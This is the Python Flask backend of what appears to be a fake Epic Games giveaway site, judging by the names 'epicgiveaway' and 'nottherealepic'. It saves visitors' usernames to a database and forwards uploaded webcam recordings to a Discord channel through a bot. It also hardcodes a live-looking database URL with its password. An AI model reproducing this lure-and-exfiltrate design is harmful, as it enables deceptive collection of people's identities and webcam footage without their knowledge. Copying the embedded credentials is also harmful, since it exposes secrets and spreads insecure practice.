from flask import Flask, request, jsonify, render_template
import psycopg2
from flask_cors import CORS
import os
import uuid
import requests

app = Flask(__name__)
CORS(app)

# PostgreSQL DB from Render
DATABASE_URL = "postgresql://nottherealepic:4u4lbsU8YdqcCnVsc0DYewLlOiaMabha@dpg-d1n08omr433s73b5jkg0-a.singapore-postgres.render.com/epicgiveaway_nw6s"

# Connect to PostgreSQL
conn = psycopg2.connect(DATABASE_URL, sslmode='require')
cursor = conn.cursor()

# Create table if it doesn't exist
cursor.execute('''
CREATE TABLE IF NOT EXISTS names (
    id SERIAL PRIMARY KEY,
    username TEXT NOT NULL,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
''')
conn.commit()

# Serve HTML page
@app.route('/')
def index():
    return render_template("index.html")

# API to save name to DB
@app.route('/submit-name', methods=['POST'])
def submit_name():
    data = request.json
    name = data.get('name', '').strip()
    if not name:
        return jsonify({'error': 'Name is required'}), 400

    cursor.execute("INSERT INTO names (username) VALUES (%s);", (name,))
    conn.commit()
    return jsonify({'message': 'Name saved successfully'}), 200

# Upload webcam recording to Discord via bot
DISCORD_BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
DISCORD_CHANNEL_ID = os.getenv("DISCORD_CHANNEL_ID")

@app.route('/upload-video', methods=['POST'])
def upload_video():
    video = request.files['video']
    filename = f"{uuid.uuid4()}.webm"

    files = {'file': (filename, video, 'video/webm')}
    headers = {
        'Authorization': f'Bot {DISCORD_BOT_TOKEN}'
    }

    r = requests.post(
        f'https://discord.com/api/v9/channels/{DISCORD_CHANNEL_ID}/messages',
        headers=headers,
        files=files
    )

    if r.status_code in (200, 204):
        return "Uploaded to Discord!", 200
    else:
        return f"Failed: {r.status_code} - {r.text}", 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
